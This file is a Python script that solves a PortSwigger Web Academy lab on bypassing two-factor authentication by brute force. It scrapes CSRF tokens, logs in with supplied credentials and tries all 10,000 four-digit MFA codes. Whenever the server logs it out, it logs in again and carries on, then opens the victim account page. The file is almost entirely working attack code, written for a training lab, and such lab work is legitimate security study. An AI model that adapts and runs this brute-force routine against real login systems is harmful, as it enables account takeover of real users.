# Script that solves the "2FA bypass using a brute-force attack" laboratory from PortSwigger Web Academy.
# Lab's URL: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

import requests
from bs4 import BeautifulSoup
from dataclasses import dataclass
from requests.models import Response


BASE_URL = "<BASE_URL>"
USER = "<USER>"
PASS = "<PASS>"


@dataclass(frozen=True)
class RequestContext:
    csrf: str
    session_id: str


def is_login_page(html: str) -> bool:
    soup = BeautifulSoup(html, features="html.parser")
    has_username_input = soup.find("input", {"name": "username"}) is not None
    has_password_input = soup.find("input", {"name": "password"}) is not None
    
    return has_username_input and has_password_input

def extract_csrf_code(html: str) -> str:
    soup = BeautifulSoup(html, features="html.parser")
    return soup.find("input", {"name": "csrf", "type": "hidden"}).get("value")

def log_in_with_credentials(
    username: str, 
    password: str, 
    current_context: RequestContext
) -> str:
    # Log in with credentials and get the session ID.
    response = requests.post(
        f"{BASE_URL}/login", 
        data={"csrf": current_context.csrf, "username": username, "password": password},
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        cookies=dict(session=current_context.session_id),
        allow_redirects=False
    )
    
    return response.cookies["session"]

def log_in_with_mfa(mfa_code: str, current_context: RequestContext) -> Response:
    return requests.post(
        f"{BASE_URL}/login2", 
        data={"csrf": current_context.csrf, "mfa-code": mfa_code},
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        cookies=dict(session=current_context.session_id),
        allow_redirects=False
    )


print("[*] GET /login")
login_page_response = requests.get(f"{BASE_URL}/login")
current_context = RequestContext(extract_csrf_code(login_page_response.text), login_page_response.cookies["session"])
print(f"[*] Current context: {current_context}")

print("[*] POST /login")
session_id = log_in_with_credentials(USER, PASS, current_context)
print(f"[*] Logged in user's session ID: {session_id}")

print("[*] GET /login2")
mfa_login_page_response = requests.get(f"{BASE_URL}/login2", cookies=dict(session=session_id))
current_context = RequestContext(extract_csrf_code(mfa_login_page_response.text), session_id)
print(f"[*] Current context: {current_context}")

for x in range(10_000):
    mfa_code = f"{x:0>4}"
    print(f"[*] Trying code: {mfa_code}")
    
    mfa_login_response = log_in_with_mfa(mfa_code, current_context)
    
    if "Incorrect security code" in mfa_login_response.text:
        # Need to log in again    
        if is_login_page(mfa_login_response.text):
            new_session_id = log_in_with_credentials(
                USER, PASS, RequestContext(extract_csrf_code(mfa_login_response.text), mfa_login_response.cookies["session"])
            )
            response = requests.get(f"{BASE_URL}/login2", cookies=dict(session=new_session_id))
            current_context = RequestContext(extract_csrf_code(response.text), new_session_id)
            print(f"[*] Re-logged in. {current_context}")
        else:
            current_context = RequestContext(extract_csrf_code(mfa_login_response.text), current_context.session_id)
    else:
        print(f"SUCCESS! {current_context}")
        print(f"Found MFA code: {mfa_code}")
        break

print(mfa_login_response)
print(mfa_login_response.text)
print(mfa_login_response.headers)

my_account_response = requests.get(f"{BASE_URL}/my-account?id=carlos", cookies=dict(session=mfa_login_response.cookies["session"]))

print(my_account_response)
print(my_account_response.text)
print(my_account_response.headers)
